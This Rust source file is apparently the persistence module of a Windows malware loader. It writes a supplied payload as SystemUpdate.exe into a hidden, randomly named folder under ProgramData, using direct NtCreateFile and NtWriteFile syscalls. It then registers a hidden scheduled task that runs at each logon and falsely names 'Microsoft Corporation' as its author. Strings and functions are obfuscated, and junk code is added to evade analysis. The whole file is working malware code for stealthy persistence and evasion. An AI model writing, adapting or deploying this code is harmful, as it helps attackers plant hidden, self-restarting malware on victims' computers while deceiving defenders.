use crate::syscalls;
use hex::ToHex;
use obfuscator::{obfuscate, obfuscate_string};
use rand::{thread_rng, Rng};
use std::ffi::OsStr;
use std::fs;
use std::iter::once;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use std::ptr;
use windows::core::{BSTR, VARIANT};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
};
use windows::Win32::System::TaskScheduler::{
    IRegisteredTask, ITaskFolder, ITaskService, TaskScheduler, TASK_CREATE_OR_UPDATE,
    TASK_LOGON_INTERACTIVE_TOKEN,
};

#[cfg(windows)]
const FILE_OVERWRITE_IF: u32 = 0x00000005;
#[cfg(windows)]
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
#[cfg(windows)]
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
#[cfg(windows)]
const GENERIC_WRITE: u32 = 0x40000000;
#[cfg(windows)]
const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;

#[cfg(windows)]
#[obfuscate(garbage = true)]
unsafe fn add_to_scheduled_task(file_path: &str) -> Result<(), String> {
    let task_xml = format!(
        r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>System Stability and Performance Monitoring</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{}"</Command>
    </Exec>
  </Actions>
</Task>"#,
        file_path
    );

    if CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED).is_err() {
        return Err(obfuscate_string!("Failed to initialize COM.").to_string());
    }

    let p_svc: ITaskService =
        match CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER) {
            Ok(svc) => svc,
            Err(_) => {
                CoUninitialize();
                return Err(obfuscate_string!("Failed to create Task Scheduler instance.").to_string());
            }
        };

    if p_svc.Connect(
        VARIANT::default(),
        VARIANT::default(),
        VARIANT::default(),
        VARIANT::default(),
    ).is_err() {
        CoUninitialize();
        return Err(obfuscate_string!("Failed to connect to Task Scheduler.").to_string());
    }

    let p_folder: ITaskFolder = match p_svc.GetFolder(&BSTR::from("\\")) {
        Ok(folder) => folder,
        Err(_) => {
            CoUninitialize();
            return Err(obfuscate_string!("Failed to get root task folder.").to_string());
        }
    };

    let p_task: IRegisteredTask = match p_folder.RegisterTaskDefinition(
        &BSTR::from("SystemUpdate"),
        None,
        TASK_CREATE_OR_UPDATE.0 as i32,
        None,
        None,
        TASK_LOGON_INTERACTIVE_TOKEN,
        &VARIANT::from(BSTR::from(task_xml)),
    ) {
        Ok(task) => task,
        Err(_) => {
            CoUninitialize();
            return Err(obfuscate_string!("Failed to register task.").to_string());
        }
    };

    CoUninitialize();
    Ok(())
}


#[cfg(windows)]
#[obfuscate(garbage = true)]
pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
    let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
        Ok(s) => s,
        Err(_) => {
            return Err(obfuscate_string!("ProgramData environment variable not found.").to_string())
        }
    };

    if program_data.ends_with('\\') && program_data.len() > 3 {
        program_data.pop();
    }

    let mut rng = thread_rng();
    let random_bytes: Vec<u8> = (0..6).map(|_| rng.random::<u8>()).collect();
    let dir_name: String = random_bytes.encode_hex();

    let folder_path = format!("{}\\{}", program_data, dir_name);
    let full_file_path_win = format!("{}\\SystemUpdate.exe", folder_path);

    if let Err(e) = fs::create_dir_all(&folder_path) {
        return Err(format!(
            "{}{}",
            obfuscate_string!("Failed to create persistence directory: "),
            e
        ));
    }

    let folder_path_w: Vec<u16> = folder_path.encode_utf16().chain(Some(0)).collect();
    SetFileAttributesW(folder_path_w.as_ptr(), FILE_ATTRIBUTE_HIDDEN);

    let nt_path = format!("\\??\\{}", full_file_path_win);

    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();

    let len_bytes = (wide_path.len() * 2) as u16;
    let max_len_bytes = ((wide_path.len() + 1) * 2) as u16;

    let mut unicode_string_path = syscalls::UNICODE_STRING {
        Length: len_bytes,
        MaximumLength: max_len_bytes,
        Buffer: wide_path.as_mut_ptr(),
    };

    let mut file_handle: HANDLE = ptr::null_mut();
    let mut io_status_block = syscalls::IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };

    let mut obj_attributes = syscalls::OBJECT_ATTRIBUTES {
        Length: mem::size_of::<syscalls::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: &mut unicode_string_path,
        Attributes: 0x00000040,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    let status = (syscalls::SYSCALLS.NtCreateFile)(
        &mut file_handle,
        GENERIC_WRITE | 0x00100000,
        &mut obj_attributes,
        &mut io_status_block,
        ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        ptr::null_mut(),
        0,
    );

    if status != 0 {
        return Err(format!(
            "{}{:X}",
            obfuscate_string!("NtCreateFile failed with status: "),
            status
        ));
    }

    let write_status = (syscalls::SYSCALLS.NtWriteFile)(
        file_handle,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        &mut io_status_block,
        payload_data.as_ptr() as *mut std::ffi::c_void,
        payload_data.len() as u32,
        ptr::null_mut(),
        ptr::null_mut(),
    );

    let mut result: Result<(), String> = Ok(());

    if write_status != 0 {
        result = Err(format!(
            "{}{:X}",
            obfuscate_string!("NtWriteFile failed with status: "),
            write_status
        ));
    } else if io_status_block.information != payload_data.len() {
        result = Err(obfuscate_string!("NtWriteFile wrote incomplete data.").to_string());
    }

    (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);

    if result.is_ok() {
        if let Err(e) = add_to_scheduled_task(&full_file_path_win) {
            return Err(format!(
                "{}{}",
                obfuscate_string!("Failed to add to startup: "),
                e
            ));
        }
    }

    result
}
